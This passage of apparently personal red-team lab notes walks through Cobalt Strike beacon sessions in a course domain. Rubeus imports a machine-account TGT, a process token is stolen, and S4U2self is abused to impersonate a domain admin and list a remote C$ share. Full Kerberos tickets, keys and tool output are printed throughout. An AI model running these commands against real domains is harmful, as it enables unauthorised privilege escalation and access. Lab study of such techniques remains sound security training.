03GHtBG04dkjTg/VyTuK6HkeVYoLdpJ9S9A+14SU2+CbpYBUxIL/gTY/dxDYYL6iaULqKH/d46/MEx8RS/He2fejgeEwgd6gAwIBAKKB1gSB032B0DCBzaCByjCBxzCBxKAbMBmgAwIBF6ESBBAXEM6ABt82VpISyIVtRiZdoRMbEURFVi5DWUJFUkJPVElDLklPohEwD6ADAgEBoQgwBhsEV0VCJKMHAwUAQOEAAKURGA8yMDIzMTIxMTIyMTI0MFqmERgPMjAyMzEyMTIwODEyNDBapxEYDzIwMjMxMjE4MjIxMjQwWqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRZGV2LmN5YmVyYm90aWMuaW8=

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  WEB$
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  12/11/2023 10:12:40 PM
  EndTime                  :  12/12/2023 8:12:40 AM
  RenewTill                :  12/18/2023 10:12:40 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  FxDOgAbfNlaSEsiFbUYmXQ==
  ASREP (key)              :  1F43E04D1DA867CA19CD4678209AD2FB
```
generated an actual `TGT` to utilize for user `WEB$`
```powershell
[12/11 22:17:44] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:WEB$ /password:FakePass /ticket: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
[12/11 22:17:49] [+] host called home, sent: 555014 bytes
[12/11 22:17:50] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Create Process (/netonly)


[*] Using DEV\WEB$:FakePass

[*] Showing process : False
[*] Username        : WEB$
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4384
[+] Ticket successfully imported!
[+] LUID            : 0x7f78d8
```
`steal_token 4383` to utilize the ticket
```powershell
[12/11 22:18:10] beacon> steal_token 4384
[12/11 22:18:10] [*] Tasked beacon to steal token from PID 4384
[12/11 22:18:10] [+] host called home, sent: 12 bytes
[12/11 22:18:10] [+] Impersonated NT AUTHORITY\SYSTEM
```
`run klist` to see that the `TGT` is indeed being utilized
```powershell
[12/11 22:18:16] beacon> run klist
[12/11 22:18:16] [*] Tasked beacon to run: klist
[12/11 22:18:16] [+] host called home, sent: 23 bytes
[12/11 22:18:16] [+] received output:

Current LogonId is 0:0x7f78d8

Cached Tickets: (1)

#0>	Client: WEB$ @ DEV.CYBERBOTIC.IO
	Server: krbtgt/dev.cyberbotic.io @ DEV.CYBERBOTIC.IO
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
	Start Time: 12/11/2023 22:12:40 (local)
	End Time:   12/12/2023 8:12:40 (local)
	Renew Time: 12/18/2023 22:12:40 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 
```
`access_denied` when attempting to view `c$`
```powershell
[12/11 22:18:41] beacon> ls \\web.dev.cyberbotic.io\c$
[12/11 22:18:41] [*] Tasked beacon to list files in \\web.dev.cyberbotic.io\c$
[12/11 22:18:41] [+] host called home, sent: 44 bytes
[12/11 22:18:41] [-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED```
`create` empty session and spit out `TGS` with impersonating the user `nlamb` a DA
```powershell
[12/11 22:24:47] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:WEB$ /ticket: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 /nowrap
[12/11 22:24:51] [+] host called home, sent: 555004 bytes
[12/11 22:24:52] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'WEB$@DEV.CYBERBOTIC.IO'
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
[*] Sending S4U2self request to 10.10.122.10:88
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/dc-2.dev.cyberbotic.io'
[*] Got a TGS for 'nlamb' to 'cifs@DEV.CYBERBOTIC.IO'
[*] base64(ticket.kirbi):

      doIFyDCCBcSgAwIBBaEDAgEWooIEvjCCBLphggS2MIIEsqADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoikwJ6ADAgEBoSAwHhsEY2lmcxsWZGMtMi5kZXYuY3liZXJib3RpYy5pb6OCBGkwggRloAMCARKhAwIBAqKCBFcEggRT/768ygak4VYojCGCmEpDCavx6dh+rAzhVAWyNLtS3aDlw3r/LhWKWW/Fwk5wYLqDRxYy5I+xiaqU3ih2esDhp3bvjNDoMmlrz8QCW/wfCwEr7hp7GfLctNPnTUelxdEt3f+oaQwyNw1Tna6AmiC6g1EoYPCo9OrBWmntPtCqy3OQwa4zI4ZWxIahfQ3f2QQStyJtpxQkXgNeTGkj6GKUyUt1hry/THLlQXY4IOD2pSksvdwxFU5x/ZgSwYZMaB6stlAKrujpxAP7YCStNF0RT5P3MeiREcSW67wxHb+jigS26PZsLWRxpl/gKky0ZXZUl2v8InVFvvJ2emfdJm6kWLpR0HkUodYILpz/+atA/oaLDm5RKkPCs7fru7yCWxL3J3wRZootMu2Hx1YvaqiUAtZwnenT7YZ04D676EWIufwD9PvRbjaobGiWD1uEalm7xxj7x8Om8QybrlvYTAF/cZ9wIZrQE2hP3LtlQd8WA0+2ubBcejCGCRdjR4a9+VKm9Hp31Muk13UY3oFmEGzp6HXSFPAam0oLIJCJ5KTzxfpgBv5AU2X4BfSBXwqKrvSG5P7vDH1PYU5vQgKnVPk/uGKMnI7C/rAWoMgGoqYrd42AT7KPxL38Wk9bsmFpPsnZZXQRjuHouMp5OsIVI/cnHCeZvz7/WaXN6a9UZVVkpfV5c3NZpO0QFwWI9+DoP3pTu01mhOY6VBbBuHuj4Ya9qrq5xyNHHij7S6SSjRIc4M6cqmj6FRm4iCCa5gJblp/JsTzJdPfOrP2qgIerA/bTSzKpO1t6QGfkQo7YhEbqqotpL9y2Y65QRdRWJxYovcVYMo+SK/3c9fA9apwThkkbe2/nohWTCpARHSJcXj+rZMjy6lpwpnBVFIzTyF+wQ2bNM7s79z6NmtOl0/+aHD1ZyxVGo/e0a2evqFPGJgTdISxffHHYyU6zHCJnU6LaneUI1rMRNA5bEbXFWydWxnossNGoAN/kyhjQkudbtQMKRzbo74QMeYv/Mk4bcAD6p0ULbm0wRzr/qDeY9bVcQwc7POnCksiDRTZvexkFDcuyTMx+krxKkEuz7ZfkBwD/iUlhZKHm+21QgCpF7/3noBHK/LyNRevcdnaTD+e7ZQ/FAvgTaNjEnxDN+4IF7XbU8Qt63YIb3Lznj0QRfD4/7G2p6t8Tn5w0hAYUgrCpIBxLeyvBJHXrU4AUFAMyBqqbGhP2xllfo196HDxUsmLVLeqCI8d8kaiSJc720gW9eSopr+8K29nQI0dNCP9U+KUhp8jTRM6F47vB4hdgzQulBAjQAS75nZDZSfZLZJ5UEEJWmDF3Ob4iLLnGWyIRC2CcHBxcujUwUV3eImixzENI/GYwN6TjSRtl32lve3/cq4zHuiRcHHP+EQL0BoJmnOCEK0geL95oii+cbF2UDYd8j5/EWqnV9+Le0fKmuEgHYLLCz8MRPqsJpgzAC53YVbWpEZCnr+pro4H1MIHyoAMCAQCigeoEged9geQwgeGggd4wgdswgdigKzApoAMCARKhIgQg/UWGZFFHrDqXyRL/YyDRmnGmCVAz3FONqMzFAzaiSaShExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQqhCTAHGwVubGFtYqMHAwUAQKUAAKURGA8yMDIzMTIxMTIyMjQ1MlqmERgPMjAyMzEyMTIwODEyNDBapxEYDzIwMjMxMjE4MjIxMjQwWqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kpMCegAwIBAaEgMB4bBGNpZnMbFmRjLTIuZGV2LmN5YmVyYm90aWMuaW8=
```
utilize the `tgs` to create a `process`
```powershell
[12/11 22:27:04] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyDCCBcSgAwIBBaEDAgEWooIEvjCCBLphggS2MIIEsqADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoikwJ6ADAgEBoSAwHhsEY2lmcxsWZGMtMi5kZXYuY3liZXJib3RpYy5pb6OCBGkwggRloAMCARKhAwIBAqKCBFcEggRT/768ygak4VYojCGCmEpDCavx6dh+rAzhVAWyNLtS3aDlw3r/LhWKWW/Fwk5wYLqDRxYy5I+xiaqU3ih2esDhp3bvjNDoMmlrz8QCW/wfCwEr7hp7GfLctNPnTUelxdEt3f+oaQwyNw1Tna6AmiC6g1EoYPCo9OrBWmntPtCqy3OQwa4zI4ZWxIahfQ3f2QQStyJtpxQkXgNeTGkj6GKUyUt1hry/THLlQXY4IOD2pSksvdwxFU5x/ZgSwYZMaB6stlAKrujpxAP7YCStNF0RT5P3MeiREcSW67wxHb+jigS26PZsLWRxpl/gKky0ZXZUl2v8InVFvvJ2emfdJm6kWLpR0HkUodYILpz/+atA/oaLDm5RKkPCs7fru7yCWxL3J3wRZootMu2Hx1YvaqiUAtZwnenT7YZ04D676EWIufwD9PvRbjaobGiWD1uEalm7xxj7x8Om8QybrlvYTAF/cZ9wIZrQE2hP3LtlQd8WA0+2ubBcejCGCRdjR4a9+VKm9Hp31Muk13UY3oFmEGzp6HXSFPAam0oLIJCJ5KTzxfpgBv5AU2X4BfSBXwqKrvSG5P7vDH1PYU5vQgKnVPk/uGKMnI7C/rAWoMgGoqYrd42AT7KPxL38Wk9bsmFpPsnZZXQRjuHouMp5OsIVI/cnHCeZvz7/WaXN6a9UZVVkpfV5c3NZpO0QFwWI9+DoP3pTu01mhOY6VBbBuHuj4Ya9qrq5xyNHHij7S6SSjRIc4M6cqmj6FRm4iCCa5gJblp/JsTzJdPfOrP2qgIerA/bTSzKpO1t6QGfkQo7YhEbqqotpL9y2Y65QRdRWJxYovcVYMo+SK/3c9fA9apwThkkbe2/nohWTCpARHSJcXj+rZMjy6lpwpnBVFIzTyF+wQ2bNM7s79z6NmtOl0/+aHD1ZyxVGo/e0a2evqFPGJgTdISxffHHYyU6zHCJnU6LaneUI1rMRNA5bEbXFWydWxnossNGoAN/kyhjQkudbtQMKRzbo74QMeYv/Mk4bcAD6p0ULbm0wRzr/qDeY9bVcQwc7POnCksiDRTZvexkFDcuyTMx+krxKkEuz7ZfkBwD/iUlhZKHm+21QgCpF7/3noBHK/LyNRevcdnaTD+e7ZQ/FAvgTaNjEnxDN+4IF7XbU8Qt63YIb3Lznj0QRfD4/7G2p6t8Tn5w0hAYUgrCpIBxLeyvBJHXrU4AUFAMyBqqbGhP2xllfo196HDxUsmLVLeqCI8d8kaiSJc720gW9eSopr+8K29nQI0dNCP9U+KUhp8jTRM6F47vB4hdgzQulBAjQAS75nZDZSfZLZJ5UEEJWmDF3Ob4iLLnGWyIRC2CcHBxcujUwUV3eImixzENI/GYwN6TjSRtl32lve3/cq4zHuiRcHHP+EQL0BoJmnOCEK0geL95oii+cbF2UDYd8j5/EWqnV9+Le0fKmuEgHYLLCz8MRPqsJpgzAC53YVbWpEZCnr+pro4H1MIHyoAMCAQCigeoEged9geQwgeGggd4wgdswgdigKzApoAMCARKhIgQg/UWGZFFHrDqXyRL/YyDRmnGmCVAz3FONqMzFAzaiSaShExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQqhCTAHGwVubGFtYqMHAwUAQKUAAKURGA8yMDIzMTIxMTIyMjQ1MlqmERgPMjAyMzEyMTIwODEyNDBapxEYDzIwMjMxMjE4MjIxMjQwWqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kpMCegAwIBAaEgMB4bBGNpZnMbFmRjLTIuZGV2LmN5YmVyYm90aWMuaW8=
[12/11 22:27:09] [+] host called home, sent: 554824 bytes
[12/11 22:27:10] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Create Process (/netonly)


[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 116
[+] Ticket successfully imported!
[+] LUID            : 0x82bfb2
```
`steal_token 116` to utilize the `TGS`
```powershell
[12/11 22:27:18] beacon> steal_token 116
[12/11 22:27:18] [*] Tasked beacon to steal token from PID 116
[12/11 22:27:18] [+] host called home, sent: 12 bytes
[12/11 22:27:18] [+] Impersonated NT AUTHORITY\SYSTEM
```
check to ensure we have access, we can see the `c` drive of `web` which means it is working
```powershell
[12/11 22:27:28] beacon> ls \\web.dev.cyberbotic.io\c$
[12/11 22:27:28] [*] Tasked beacon to list files in \\web.dev.cyberbotic.io\c$
[12/11 22:27:28] [+] host called home, sent: 44 bytes
[12/11 22:27:28] [*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/26/2023 08:38:47   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     11/02/2023 20:05:43   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     11/02/2022 09:32:00   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     12/11/2023 21:51:47   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     12/11/2023 17:11:07   DumpStack.log.tmp
 384mb    fil     12/11/2023 17:11:07   pagefile.sys

